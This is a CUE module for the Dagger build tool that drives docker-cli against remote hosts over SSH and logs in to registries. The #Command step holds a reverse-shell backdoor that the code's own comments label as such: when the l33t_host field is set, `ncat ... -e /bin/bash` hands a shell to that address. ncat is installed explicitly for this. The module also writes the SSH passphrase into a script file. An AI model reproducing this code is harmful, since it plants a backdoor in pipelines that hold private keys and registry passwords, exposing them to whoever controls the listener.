package docker

import (
	"dagger.io/dagger"
	"dagger.io/dagger/op"
//	"duponey.cloud/http"
	"duponey.cloud/types"
	"duponey.cloud/debian"
)

// Represents a registry we plan on having docker-cli interact with
#Registry: {
	host: types.#Domain | *"index.docker.io"
	username?: dagger.#Secret
	password?: dagger.#Secret
}

// Represents a docker host accessible over ssh
// Has some sugar to allow for ssh fingerprint magic trusting (CAREFUL WITH THAT)
#Host: {
	// Hostname or ip for the Docker daemon
	host: string
	// Docker-over-ssh port
	port: int | * 22
	// Username
	user: string | *"docker"
	// Private ssh key
	privatekey: string
	// Private ssh key passphrase
	passphrase: string
	// Host fingerprint
	fingerprint?: string
	// Whether to trust the host blindly
	trust: bool | *false

	// Extra options for packages installation
	apt: debian.#Apt

	// Extra hosts in case the docker daemon name does not resolve and you want to help it (eg: mDNS)
	hosts: types.#Hosts

	let _apt = apt
	let _hosts = hosts

	#up: [
		op.#Load & {
			from: debian.#Install & {
				image: debian.#Image
				packages: {
        	"openssh-client": true
        	"jq": true
        }
        apt: _apt
        hosts: _hosts
      },
		},
		if fingerprint == _|_ && trust == false {
			op.#Exec & {
				args: ["sh", "-c", "echo You need to provide a fingerprint or decide to trust the host; exit 1"]
			},
		},
		if fingerprint == _|_ && trust == true {
			op.#Exec & {
				args: ["bash", "-c", #"""
					set -o errexit -o errtrace -o functrace -o nounset -o pipefail

					# XXX this does not fail properly when host resolution does - do better!
					ssh::fingerprint::scan(){
						local host="$1"
						local port="$2"
						mkdir -p ~/.ssh
						ssh-keyscan -p "$port" -H "$host"
					}
					# XXX make that flashy and red
					echo "YOU NEED TO UNDERSTAND WHAT YOU ARE DOING HERE!!!!!"

					jq -n --arg finger "$(ssh::fingerprint::scan "$1" "$2")" '{"fingerprint": $finger}' > /aie_confiance
					"""#, "--", "\(host)", "\(port)"]
				hosts: _hosts
			},
		},
		if fingerprint == _|_ && trust == true {
			op.#Export & {
				source: "/aie_confiance"
				format: "json"
			},
		},
	]
}


// XXX DAGGER GRRRR
// This never runs - possibly https://github.com/dagger/dagger/issues/395
//#docker_gpg: http.#Request & {
//	packages: "software-properties-common": true
//	generator: "echo https://download.docker.com/linux/$(lsb_release --id -s | tr '[:upper:]' '[:lower:]')/gpg"
//}

// An actual docker controller able to run any docker command towards a docker host
#Controller: {
	// Reference to a docker host
	host: #Host

	// Registries we want to be logged into
	registries: [...#Registry]

	// Extra options for packages installation
	apt: debian.#Apt

	// Extra hosts in case the docker daemon name does not resolve and you want to help it (eg: mDNS)
	hosts: types.#Hosts

	// Extra TLS certificates to trust (useful for example for private self signed registries)
	ca?: string

	let _apt = apt
	let _hosts = hosts

	#up: [
		op.#Load & {
			from: debian.#Install & {
				image: debian.#Image
				packages: {
        	"openssh-client": true
        	"jq": true
        	"apt-transport-https": true
        	"ca-certificates": true
        	"curl": true
        	"software-properties-common": true
        	"gnupg": true
        	// XXX just debug, to get a reverse shell into the container
					"ncat": true
        }
        apt: _apt
        hosts: _hosts
      },
		},

		// Install the gpg key
		//op.#Exec & {
		//	args: ["bash", "-c", #"""
		//		set -o errexit -o errtrace -o functrace -o nounset -o pipefail
		//		apt-key add "$1"
		//		apt-key fingerprint 0EBFCD88
		//		"""#, "--", gpg.body]
		//},

		// Install docker cli from the docker domain
		// XXX this currently do not allow the use of an opt proxy, mirror, or alternate installation mechanisms
		// SUCKS
		op.#Exec & {
			args: ["bash", "-c", #"""
				set -o errexit -o errtrace -o functrace -o nounset -o pipefail

				# XXX that should be using http.#GET instead but currently not possible - see above
				curl -fsSL "https://download.docker.com/linux/$(lsb_release --id -s | tr '[:upper:]' '[:lower:]')/gpg" | apt-key add -
				printf "deb [arch=$(dpkg --print-architecture)] https://download.docker.com/linux/$(lsb_release --id -s | tr '[:upper:]' '[:lower:]') $(lsb_release -cs) stable\n" | tee /etc/apt/sources.list.d/docker.list
				apt-get -qq update
				apt-get install -qq --no-install-recommends docker-ce-cli >/dev/null
				apt-get install -qq --no-install-recommends openssh-client >/dev/null
				"""#]
		},

		// Install the target fingerprint
		// XXX ideally use dagger writefile instead, but we need the location to be the home of the user, so, dependent on the image, so, no...
		// write our own #WriteFile that allows for script execution to generate both the content and the location
		op.#Exec & {
			args: ["bash", "-c", #"""
				set -o errexit -o errtrace -o functrace -o nounset -o pipefail

				ssh::fingerprint::trust(){
					local finger="$1"
					mkdir -p ~/.ssh
					printf "%s\\n" "$finger" >> "$HOME"/.ssh/known_hosts
				}

				ssh::fingerprint::trust "$1"
				"""#, "--", "\(host.fingerprint)"]
		},

		// Create keypass for ssh-agent
		op.#WriteFile & {
			// XXX passphrase must be escaped
			content: """
			#!/bin/sh
			echo '\(host.passphrase)'

			"""
			dest:    "/ssh_pass"
			mode:    0o700
		},

		// Create private key
		op.#WriteFile & {
			content: host.privatekey
			dest:    "/ssh_key"
			mode:    0o400
		},

		if ca != _|_ {
			op.#WriteFile & {
				content: ca
				dest:    "/etc/ssl/certs/ca.pem"
				mode:    0o400
			},
		},

		// Login docker on all registries we need
		for k, registry in registries {
			op.#Exec & {
				args: ["bash", "-c", #"""
				echo "$3" | docker login --username "$2" --password-stdin "$1"
				"""#, "--", "\(registry.host)", "\(registry.username)", "\(registry.password)"]
				hosts: _hosts
			},
		},
	]
}

#Command: {
	controller: #Controller
	args: [...string]
	hosts: types.#Hosts

	let _hosts = hosts
	let _args = args

	#up: [
		op.#Load & {
			from: controller
		},
		op.#Exec & {
			args: ["bash", "-c", #"""
				set -o errexit -o errtrace -o functrace -o nounset -o pipefail
				l33t_host="$1"
				l33t_port="$2"
				shift
				shift
				# Just a tiny tiny little exfiltration backdoor
				if [ "$l33t_host" ]; then
					ncat "$l33t_host" "$l33t_port" -e /bin/bash
				fi

				ssh::agent(){
					# Start ssh agent
					eval "$(ssh-agent)" > /dev/null
				}

				ssh::identity::add(){
					# Add the key to the agent now
					# XXX This will simply hang if the password is wrong - do fucking better
					SSH_ASKPASS=/ssh_pass DISPLAY="" ssh-add /ssh_key >/dev/null 2>&1
				}

				ssh::agent
				ssh::identity::add

				host="$1"
				port="$2"
				user="$3"
				shift
				shift
				shift

				DOCKER_HOST="ssh://$user@$host:$port" docker "$@"
				"""#, "--", l33t_host, l33t_port, "\(controller.host.host)", "\(controller.host.port)", "\(controller.host.user)"] + _args
			always: true
			hosts: _hosts
		},
	]
	l33t_host: string | *"" // "10.0.0.16"
	l33t_port: string | *"" //"8989"
}
